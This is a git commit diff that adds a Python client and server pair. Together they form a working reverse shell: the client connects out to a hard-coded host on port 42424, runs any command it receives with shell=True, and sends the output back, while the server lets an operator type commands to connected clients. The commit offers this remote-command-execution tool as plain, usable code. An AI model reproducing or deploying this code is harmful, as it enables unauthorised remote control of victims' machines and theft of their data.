b89a7e21f8fcc3d45b3f235686903e53ee9e410a
Ofer <ofer026@gmail.com>
2020-04-01 22:02:25 +0300

    server and client scripts were missing

---
+++ single client/client (NO GUI).py
@@ -0,0 +1,48 @@
+import socket
+import subprocess
+import os
+
+# ------CONSTANTS-------
+HEADERSIZE = 10
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("192.168.0.105", 42424))
+
+
+while True:
+    full_msg = ''
+    new_msg = True
+    while True:
+        msg = s.recv(16)
+        if new_msg:
+            #print("new msg len:",msg[:HEADERSIZE])
+            msglength = msg[:HEADERSIZE].decode("utf-8")
+            print("msg length {}".format(msglength.strip(" ")))
+            try:
+                msglen = int(msglength)
+            except ValueError:
+                continue
+            new_msg = False
+
+        #print(f"full message length: {msglen}")
+
+        full_msg += msg.decode("utf-8")
+
+        #print(len(full_msg))
+
+
+        if len(full_msg)-HEADERSIZE == msglen:
+            full_msg = full_msg[HEADERSIZE:]
+            if "cd" in full_msg:
+                print("testt")
+                os.chdir(full_msg[3:])
+            if len(full_msg) > 0:
+                cmd = subprocess.Popen(full_msg[:], shell=True, stdout=subprocess.PIPE,
+                                       stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                output_bytes = cmd.stdout.read() + cmd.stderr.read()
+                output_str = str(output_bytes, "utf-8")
+                output_str = output_str + str(os.getcwd()) + '> '
+                output_str = f"{len(output_str):<{HEADERSIZE}}"+ output_str
+                s.send(str.encode(output_str, "utf-8"))
+            full_msg = ""
+            new_msg = True
---
+++ single client/server.py
@@ -0,0 +1,51 @@
+import socket
+import sys
+
+# ------CONSTANTS-------
+HEADERSIZE = 10
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind(("", 42424))
+print("Server is running")
+s.listen(5)
+clientsockets = []
+
+def send_commands(conn):
+    while True:
+        cmd = input()
+        if cmd == 'quit':
+            conn.close()
+            s.close()
+            sys.exit()
+        if len(str.encode(cmd)) > 0:
+            cmd = f"{len(cmd):<{HEADERSIZE}}" + cmd
+            conn.send(str.encode(cmd))
+            client_response = ""
+            is_new = True
+            while True:
+                try:
+                    msg = conn.recv(16)
+                except ConnectionResetError:
+                    print("Connection has been closed by the client")
+                    return
+                if is_new:
+                    try:
+                        response_len = int(msg[:HEADERSIZE])
+                    except ValueError:
+                        continue
+                    is_new = False
+                client_response += msg.decode("utf-8")
+                if len(client_response)-HEADERSIZE == response_len:
+                    print(client_response[HEADERSIZE:], end="")
+                    break
+
+
+while True:
+    clientsocket, address = s.accept()
+    clientsockets.append(clientsocket)
+    print(f"Connection from {address[0]}:{address[1]} has been established.")
+    #msg = f"Hello {address[0]}"
+    #msg = f"{len(msg):<{HEADERSIZE}}" + msg
+    #clientsocket.send(bytes(msg, "utf-8"))
+    send_commands(clientsocket)
+    clientsocket.close()
